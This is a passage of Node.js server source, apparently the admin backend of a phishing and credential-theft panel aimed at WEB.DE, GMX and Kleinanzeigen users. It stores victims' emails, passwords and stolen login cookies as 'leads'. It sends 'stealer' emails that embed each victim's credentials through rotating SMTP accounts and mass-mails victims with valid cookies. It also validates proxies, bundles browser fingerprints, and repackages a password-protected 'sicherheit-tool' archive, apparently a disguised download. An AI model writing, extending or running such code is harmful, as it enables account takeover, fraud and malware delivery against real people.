          const socket = net.createConnection(parsed.port, parsed.host, () => {
            socket.destroy();
            resolve({ ok: true });
          });
          socket.setTimeout(Math.min(timeoutMs, 5000));
          socket.on('timeout', () => {
            socket.destroy();
            resolve({ ok: false, error: 'Таймаут TCP' });
          });
          socket.on('error', (err) => {
            resolve({ ok: false, error: (err && err.message) || 'Ошибка подключения' });
          });
        });
      }

      function buildProxyUrl(parsed) {
        const enc = (s) => encodeURIComponent(String(s || ''));
        if (parsed.login || parsed.password) {
          return 'http://' + enc(parsed.login) + ':' + enc(parsed.password) + '@' + parsed.host + ':' + parsed.port;
        }
        return 'http://' + parsed.host + ':' + parsed.port;
      }

      function testProxyHttps(parsed) {
        return new Promise((resolve) => {
          if (!HttpsProxyAgent) {
            resolve({ ok: false, error: 'Модуль https-proxy-agent не установлен' });
            return;
          }
          const proxyUrl = buildProxyUrl(parsed);
          const agent = new HttpsProxyAgent(proxyUrl, { timeout: timeoutMs });
          const reqOpts = url.parse(testUrl);
          reqOpts.agent = agent;
          reqOpts.timeout = timeoutMs;
          const reqHttps = https.get(reqOpts, (resHttps) => {
            resHttps.destroy();
            resolve({ ok: true });
          });
          reqHttps.on('error', (err) => {
            resolve({ ok: false, error: (err && err.message) || 'Ошибка HTTPS через прокси' });
          });
          reqHttps.setTimeout(timeoutMs, () => {
            reqHttps.destroy();
            resolve({ ok: false, error: 'Таймаут HTTPS' });
          });
        });
      }

      const includeWebdeFpBundle =
        pq.webdeFpBundle === '1' ||
        pq.webdeFpBundle === 'true' ||
        pq.webdeFpBundle === 'yes' ||
        json.includeWebdeFpBundle === true ||
        json.includeWebdeFpBundle === 'true' ||
        json.includeWebdeFpBundle === 1;

      (async () => {
        for (const line of lines) {
          if (line.startsWith('#')) continue;
          const parsed = normalizeProxyLine(line);
          if (!parsed) {
            invalid.push({ line, error: 'Неверный формат (нужно host:port или host:port:login:password, разделители : ; |)' });
            continue;
          }
          let result = await testProxyTcp(parsed);
          if (!result.ok && HttpsProxyAgent) {
            result = await testProxyHttps(parsed);
          }
          if (result.ok) valid.push({ line, normalized: parsed.normalized });
          else invalid.push({ line, error: result.error, normalized: parsed.normalized });
        }
        const out = { valid, invalid };
        if (includeWebdeFpBundle) {
          let indicesContent = '';
          try {
            if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
          } catch (e) {}
          const poolPayload = buildWebdeFingerprintsListPayload();
          out.webdeIndices = { content: indicesContent, pool: poolPayload };
          // #region agent log
          try {
            fs.appendFileSync(
              '/root/.cursor/debug-461acb.log',
              `${JSON.stringify({
                sessionId: '461acb',
                hypothesisId: 'H8',
                location: 'server.js:proxies-validate-includeWebdeFpBundle',
                message: 'bundle attached',
                data: { poolEntryCount: Array.isArray(poolPayload.entries) ? poolPayload.entries.length : -1 },
                timestamp: Date.now(),
              })}\n`,
              'utf8'
            );
          } catch (eLog) {}
          // #endregion
        }
        return send(res, 200, out);
      })();
    });
    return;
  }

  if (pathname === '/api/config/zip-process' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const sourceFileName = path.basename((json.sourceFileName || '').trim().replace(/\0/g, '').replace(/\.\./g, ''));
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      let newZipName = (json.newZipName || '').trim().replace(/[^a-zA-Z0-9._-]/g, '') || 'sicherheit-tool.zip';
      if (!newZipName.toLowerCase().endsWith('.zip')) newZipName += '.zip';
      const renames = json.renames && typeof json.renames === 'object' ? json.renames : {};
      const sourcePath = path.join(DOWNLOADS_DIR, sourceFileName);
      if (!sourceFileName || !fs.existsSync(sourcePath) || path.extname(sourcePath).toLowerCase() !== '.zip') {
        return send(res, 400, { ok: false, error: 'Source zip not found or not a zip' });
      }
      const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
      const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
      try {
        fs.mkdirSync(tempDir, { recursive: true });
        const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
        const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
        const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
        const extracted = fs.readdirSync(tempDir).length > 0;
        if (!extracted) {
          const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
          const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
          return send(res, 500, { ok: false, error: friendly });
        }
        const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
        function safeSegment(name) {
          const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
          return s || null;
        }
        for (const r of renameList) {
          const from = safeSegment(r.from || r[0] || '');
          const to = safeSegment(r.to || r[1] || '');
          if (!from || !to || from === to) continue;
          const oldP = path.join(tempDir, from);
          const newP = path.join(tempDir, to);
          if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
          if (fs.existsSync(oldP)) {
            fs.renameSync(oldP, newP);
          }
        }
        const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
        execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
        const finalPath = path.join(DOWNLOADS_DIR, newZipName);
        fs.copyFileSync(outZipPath, finalPath);
        const names = fs.readdirSync(DOWNLOADS_DIR);
        for (let i = 0; i < names.length; i++) {
          const n = names[i];
          const lower = n.toLowerCase();
          if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== newZipName) {
            try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
          }
        }
        writeZipPassword(newPassword);
        send(res, 200, { ok: true, fileName: newZipName });
      } catch (e) {
        const msg = (e.stderr && e.stderr.toString()) || e.message || String(e);
        let friendly = msg.length > 80 ? 'Ошибка при обработке архива.' : msg;
        if (/zip:\s*not found|command not found.*zip/i.test(msg)) {
          friendly = 'На сервере не установлена программа zip. Установите: apt install zip (или yum install zip)';
        }
        send(res, 500, { ok: false, error: friendly });
      } finally {
        try {
          if (fs.existsSync(tempDir)) {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
          }
          if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
        } catch (e) {}
      }
    });
    return;
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readStealerEmailConfig();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      recipientsList: (cur && cur.recipientsList) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64),
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || ''
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readStealerEmailConfig();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'cfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', html: '', senderName: '', title: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.recipientsList != null) cfg.recipientsList = String(json.recipientsList);
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeStealerEmailConfig(data);
      sendStealerFailedSmtpEmails.clear();
      return send(res, 200, { ok: true, id: configId });
    });
    return;
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readStealerEmailConfig();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeStealerEmailConfig(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/stealer-email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readStealerEmailConfig();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeStealerEmailConfig(data);
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/config/email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readConfigEmail();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64)
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readConfigEmail();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'cfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', senderName: '', title: '', html: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeConfigEmail(data);
      return send(res, 200, { ok: true, id: configId });
    });
    return;
  }

  if (pathname === '/api/config/email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readConfigEmail();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeConfigEmail(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readConfigEmail();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeConfigEmail(data);
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readWarmupEmailConfig();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      recipientsList: (cur && cur.recipientsList) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64),
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || ''
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readWarmupEmailConfig();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'wcfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.recipientsList != null) cfg.recipientsList = String(json.recipientsList);
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeWarmupEmailConfig(data);
      return send(res, 200, { ok: true, id: configId });
    });
    return;
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readWarmupEmailConfig();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeWarmupEmailConfig(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/warmup-email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readWarmupEmailConfig();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeWarmupEmailConfig(data);
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/send-stealer' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      let toEmail = (json.toEmail != null && json.toEmail !== '') ? String(json.toEmail).trim() : '';
      let password = (json.password != null) ? String(json.password).trim() : '';
      if (!toEmail) {
        const id = (json.id != null) ? String(json.id).trim() : '';
        if (!id) return send(res, 400, { ok: false, error: 'id or toEmail required' });
        const leads = readLeads();
        const lead = leads.find((l) => l.id === id);
        if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
        toEmail = (lead.email || lead.emailKl || '').trim();
        if (!toEmail) return send(res, 400, { ok: false, error: 'Lead has no email' });
        password = (lead.password || lead.passwordKl || '').trim();
      }
      const data = readStealerEmailConfig();
      const configId = (json.configId != null && json.configId !== '') ? String(json.configId).trim() : null;
      let cfg = configId
        ? (data.configs || []).find((c) => c.id == configId)
        : data.current;
      if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
        cfg = data.current;
        if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
          cfg = (data.configs || []).find((c) => c.smtpLine && c.smtpLine.trim());
        }
      }
      if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
        return send(res, 400, { ok: false, error: 'В конфиге не задан SMTP. Откройте /mailer/, введите SMTP (host:port:user:fromEmail:password) и нажмите «Сохранить».' });
      }
      let smtpList = parseSmtpLines(cfg.smtpLine).filter((s) => !sendStealerFailedSmtpEmails.has(s.fromEmail));
      if (!smtpList.length) return send(res, 400, { ok: false, error: 'Нет доступных SMTP (все отключены из-за ошибок отправки или не заданы).' });
      let html = (cfg.html || '')
        .replace(/_email_/g, toEmail)
        .replace(/_password_/g, password);
      const attachments = [];
      if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
        try {
          const buf = Buffer.from(cfg.image1Base64, 'base64');
          const cid = 'image1@mail';
          html = html.replace(/_src1_/g, 'cid:' + cid);
          attachments.push({ filename: 'image1.png', content: buf, cid: cid });
        } catch (e) {}
      } else if (html.indexOf('_src1_') !== -1) {
        html = html.replace(/_src1_/g, '');
      }
      if (!nodemailer) return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      // Резервируем индекс: 1-е письмо → SMTP 1, 2-е → SMTP 2, … При ошибке SMTP удаляется из списка, этому же адресу пробуем следующий.
      const smtpIndex = sendStealerSmtpIndex % smtpList.length;
      sendStealerSmtpIndex = (sendStealerSmtpIndex + 1) | 0;
      let lastError = null;
      for (let k = 0; k < smtpList.length; k++) {
        const smtp = smtpList[(smtpIndex + k) % smtpList.length];
        const transporter = nodemailer.createTransport({
          host: smtp.host,
          port: smtp.port,
          secure: smtp.port === 465,
          auth: { user: smtp.user, pass: smtp.password }
        });
        const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
        const mailOptions = {
          from: fromStr,
          to: toEmail,
          subject: (cfg.title || '').trim() || 'Message',
          html,
          attachments: attachments.length ? attachments : undefined,
          envelope: { from: smtp.fromEmail, to: toEmail }
        };
        try {
          await transporter.sendMail(mailOptions);
          return send(res, 200, { ok: true, fromEmail: smtp.fromEmail });
        } catch (err) {
          lastError = err;
          const msg = (err.message || '').slice(0, 200);
          writeDebugLog('SEND_STEALER_SMTP_ERROR', { fromEmail: smtp.fromEmail, toEmail: toEmail, message: msg });
          sendStealerFailedSmtpEmails.add(smtp.fromEmail);
        }
      }
      const msg = (lastError && lastError.message) ? String(lastError.message).slice(0, 200) : 'Все SMTP недоступны';
      return send(res, 500, { ok: false, error: msg });
    });
    return;
  }

  /** Отправка письма из конфига Config → E-Mail (не Mailer/Stealer). Кнопка E-Mail в логе админки. */
  if (pathname === '/api/send-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      if (!id) return send(res, 400, { ok: false, error: 'id required' });
      const leads = readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      if (leadIsWorkedLikeAdmin(lead)) {
        return send(res, 400, { ok: false, error: 'Лог отработан — отправка письма запрещена' });
      }
      const result = await sendConfigEmailToLead(lead);
      if (result.ok) {
        pushEvent(lead, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
        persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
        const toEmail = (lead.email || lead.emailKl || '').trim();
        console.log('[send-email] Отправка (Config E-Mail) с ' + result.fromEmail + ' на ' + toEmail);
        return send(res, 200, { ok: true, fromEmail: result.fromEmail });
      }
      persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
      const code = result.statusCode || 500;
      return send(res, code, { ok: false, error: result.error || 'Ошибка отправки' });
    });
    return;
  }

  /**
   * Массовая отправка (Config → E-Mail), 1 письмо/сек.
   * mode: all — все лиды с email (кроме отработанных); valid — есть куки входа; valid_unsent — валид и ещё не было успешной Config E-Mail (любая известная подпись в логе).
   * Отработанные (leadIsWorkedLikeAdmin) никогда не получают письмо.
   */
  if (pathname === '/api/send-email-cookies-batch' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const modeRaw = (json.mode != null) ? String(json.mode).trim() : 'valid_unsent';
      const mode = (modeRaw === 'all' || modeRaw === 'valid' || modeRaw === 'valid_unsent') ? modeRaw : null;
      if (!mode) {
        return send(res, 400, { ok: false, error: 'Укажите mode: all | valid | valid_unsent' });
      }
      if (!nodemailer) {
        return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      }
      const data = readConfigEmail();
      const cfgDefault = data.current;
      if (!cfgDefault || !(cfgDefault.smtpLine && cfgDefault.smtpLine.trim())) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
      }
      const smtpProbe = parseSmtpLines(cfgDefault.smtpLine);
      if (!smtpProbe.length) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
      }
      let leads = readLeads();
      const targets = leads.filter(function (l) {
        if (!l) return false;
        if (leadIsWorkedLikeAdmin(l)) return false;
        const to = (l.email || l.emailKl || '').trim();
        if (!to) return false;
        if (mode === 'all') return true;
        if (!leadHasSavedCookies(l)) return false;
        if (mode === 'valid_unsent' && leadHasAnyConfigEmailSentEvent(l)) return false;
        return true;
      });
      let sent = 0;
      let failed = 0;
      const failSamples = [];
      for (let i = 0; i < targets.length; i++) {
        const t = targets[i];
        const idx = leads.findIndex((x) => x && x.id === t.id);
        if (idx === -1) continue;
        const live = leads[idx];
        const result = await sendConfigEmailToLead(live);
        if (result.ok) {
          pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
          persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          sent++;
          console.log('[send-email-cookies-batch] → ' + (live.email || live.emailKl || '').trim());
        } else {
          failed++;
          if (failSamples.length < 8) {
            failSamples.push({ id: live.id, email: (live.email || '').trim(), error: result.error || '' });
          }
        }
        if (i < targets.length - 1) await new Promise((r) => setTimeout(r, 1000));
      }
      var emptyHint = '';
      if (targets.length === 0) {
        emptyHint = 'Нет лидов в выборке. Для режимов «Валид» / «Валид не отправлено» нужны сохранённые куки входа (файлы в login/cookies). «Валид не отправлено» пропускает лидов, у кого в логе уже есть «Send Email» (или старые подписи). Отработанные не берутся.';
      }
      return send(res, 200, {
        ok: true,
        mode: mode,
        total: targets.length,
        sent,
        failed,
        failSamples,
        hint: emptyHint || undefined
      });
    });
    return;
  }

  /** Архив по фильтру: отработанные (как в сайдбаре) — Klein → klLogArchived, WEB/GMX → adminLogArchived. */
  if (pathname === '/api/archive-leads-by-filter' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const filter = (json.filter != null) ? String(json.filter).trim() : '';
      if (filter !== 'worked') {
        return send(res, 400, { ok: false, error: 'Неизвестный фильтр' });
      }
      const stats = leadService.archiveLeadsByFilterWorked(pushEvent);
      return send(res, 200, {
        ok: true,
        archived: stats.archived,
        matchedWorked: stats.matchedWorked,
        skippedAlreadyArchived: stats.skippedAlreadyArchived
      });
    });
    return;
  }

  /** Массовая отправка письма из Config → E-Mail всем лидам со статусом Успех (show_success), у кого есть email. */
  if (pathname === '/api/send-email-all-success' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      if (!nodemailer) {
        return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      }
      const data = readConfigEmail();
      let cfgDefault = data.current;
      const klCfg = (data.configs || []).find(function (c) { return c.id === 'kl' || (c.name && String(c.name).toLowerCase().indexOf('klein') !== -1); });
      const smtpLineDefault = (cfgDefault && cfgDefault.smtpLine && cfgDefault.smtpLine.trim()) ? cfgDefault.smtpLine : '';
      if (!smtpLineDefault) {
        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP (текущий профиль).' });
      }
      let leads = readLeads();
      const targets = leads.filter(function (l) {
        if (l.status !== 'show_success') return false;
        const to = (l.email || l.emailKl || '').trim();
        return !!to;
      });
      let sent = 0;
      let failed = 0;
      let skipped = 0;
      const failSamples = [];

      function cfgForLead(lead) {
        let cfg = cfgDefault;
        if (lead.brand === 'klein' && klCfg && (klCfg.smtpLine || '').trim()) {
          cfg = klCfg;
        }
        return cfg;
      }

      for (let i = 0; i < targets.length; i++) {
        const lead = targets[i];
        const idx = leads.findIndex((x) => x.id === lead.id);
        if (idx === -1) {
          skipped++;
          continue;
        }
        const live = leads[idx];
        const cfg = cfgForLead(live);
        if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
          skipped++;
          continue;
        }
        const smtpList = parseSmtpLines(cfg.smtpLine);
        if (!smtpList.length) {
          skipped++;
          continue;
        }
        const toEmail = (live.email || live.emailKl || '').trim();
        const password = (live.password || live.passwordKl || '').trim();
        let html = (cfg.html || '')
          .replace(/_email_/g, toEmail)
          .replace(/_password_/g, password);
        const attachments = [];
        if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
          try {
            const buf = Buffer.from(cfg.image1Base64, 'base64');
            const cid = 'image1@mail';
            html = html.replace(/_src1_/g, 'cid:' + cid);
            attachments.push({ filename: 'image1.png', content: buf, cid: cid });
          } catch (e) {}
        } else if (html.indexOf('_src1_') !== -1) {
          html = html.replace(/_src1_/g, '');
        }
        const smtp = smtpList[0];
        const transporter = nodemailer.createTransport({
          host: smtp.host,
          port: smtp.port,
          secure: smtp.port === 465,
          auth: { user: smtp.user, pass: smtp.password }
        });
        const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
        const mailOptions = {
          from: fromStr,
          to: toEmail,
          subject: (cfg.title || '').trim() || 'Message',
          html,
          attachments: attachments.length ? attachments : undefined,
          envelope: { from: smtp.fromEmail, to: toEmail }
        };
        try {
          await transporter.sendMail(mailOptions);
          pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
          persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          sent++;
          console.log('[send-email-all-success] ' + smtp.fromEmail + ' → ' + toEmail);
        } catch (err) {
          failed++;
          const msg = (err.message || '').slice(0, 200);
          pushEvent(live, 'Письмо (массово) не отправилось: ' + msg, 'admin');
          persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
          if (failSamples.length < 8) failSamples.push({ id: live.id, email: toEmail, error: msg });
          console.error('[send-email-all-success] ошибка → ' + toEmail + ': ' + msg);
        }
        if (i < targets.length - 1) await new Promise((r) => setTimeout(r, 400));
      }
      return send(res, 200, {
        ok: true,
        total: targets.length,
        sent,
        failed,
        skipped,
        failSamples
      });
    });
    return;
  }

  /** KL: архивировать лог Klein — не принимать новые данные с того же visitId/email/fp. */
  if (pathname === '/api/lead-kl-archive' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const klLogArchived = json.klLogArchived === true;
      if (!id) return send(res, 400, { ok: false, error: 'id required' });
      const leads = readLeads();
      const lead = leads.find((l) => l.id === id);
